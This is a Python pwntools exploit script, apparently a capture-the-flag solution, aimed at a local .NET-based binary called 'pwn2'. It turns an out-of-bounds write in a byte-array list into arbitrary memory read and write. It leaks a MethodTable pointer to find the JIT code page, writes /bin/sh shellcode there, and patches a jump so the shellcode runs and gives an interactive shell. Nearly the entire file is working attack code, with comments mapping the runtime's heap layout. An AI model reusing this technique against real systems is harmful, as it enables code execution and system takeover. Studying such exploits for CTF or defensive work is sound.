#!/home/esc/py2env/bin/python27

from pwn import *
from IPython import embed

context.arch = "amd64"

# p = remote("0.0.0.0", 9998)
p = process("./pwn2")


def create(size):
    p.send("\x01" + p8(size))


def write(idx, off, size, content):
    p.send("\x03" + p8(idx) + p8(off) + p8(size) + content)


def read(idx, off, size):
    p.send("\x02" + p8(idx) + p8(off) + p8(size))


# Can get arbitrary read/write by overwriting address to private string variable
# in next index then r/w to next index, which dereferences and r/w to overwritten address

# offset from index to System.string MT:
# size of array + ( + 28 for metadata -16 for offset = 12) + 64 for 2 string classes + 8 for offset to array MT = 84 offset
def read_any(addr):
    global array_size
    write(1, array_size + 84, 8, p64(addr - 0x10))
    read(2, 0, 8)
    return p.recv()


def write_any(target, content, size=8):
    global array_size
    write(1, array_size + 84, 8, p64(target - 0x10))
    write(2, 0, size, content)


def recv():
    out = ""
    while p.can_recv(timeout=1):
        out += p.recv()
    return out


# pointer to next FastByteArray object in List located at prev + alignment
#
# Can get arbitrary read/write by overwriting next pointer in List,
# then reading/writing to next index


"""
Heap struct
0x0: *MethodTable for object type
0x8: private variable in object (or size if array of object)
.
.
.
"""

"""
MethodTable struct in heap
+0x0000: 0x0000001801000000
+0x0008: 0x0000000400034488
+0x0010: Pointer to parent type
+0x0018: Pointer to module   ->  entry in JIT page table  ->  starting $RIP in JIT page
+0x0020: 0x00007f38c3f112f0
+0x0028: Pointer to EEClass
+0x0030: 0x00007f38c3d8f608  ->  0x00095e793fa413e8
+0x0038: 0x0000000000000000
+0x0040: 0x00007f38c3f112d0  ->  0x00007f38c3d80090  ->  0x05085e7940998be8
+0x0048: 0x00007f38c3d80090  ->  0x05085e7940998be8
"""

"""
00007fb352321288 - fastbytearray MT (+32 from target addr)
0x00007fb352321268 - part of unknown MT -> 0x00007fb3521a4fe0 (+210 from target JIT address)
0x7fb3521a4f0e (target JIT address) <- write shellcode here


read fastbytearray MT
fastbytearray MT - 32 = location of JIT addr
read location of JIT addr
JIT addr - 210 = target JIT addr
loop over addr, write shellcode
run any command
"""

array_size = 100

pause()

for _ in range(15):
    create(array_size)

read(1, array_size + 76, 8)
# read MT address for FastByteArray
fba_mt = u64(recv().ljust(8, "\x00"))
pause()
# pointer to address in used JIT page
jit_addr = read_any(fba_mt - 32)
# address in JIT page to short jump instruction called for all r/w operations
target_addr = u64(jit_addr) - 192
print "short jump instruction at: ", hex(target_addr)
pause()

shellcode = asm(shellcraft.amd64.linux.sh())
shellcode_addr = target_addr + 115  # I've stopped giving a fuck

write_any(shellcode_addr, shellcode, size=len(shellcode))

# modify short jump to go to unused code area (offset 115 from eip)
write_any(target_addr + 1, "\x71", size=1)

p.interactive()
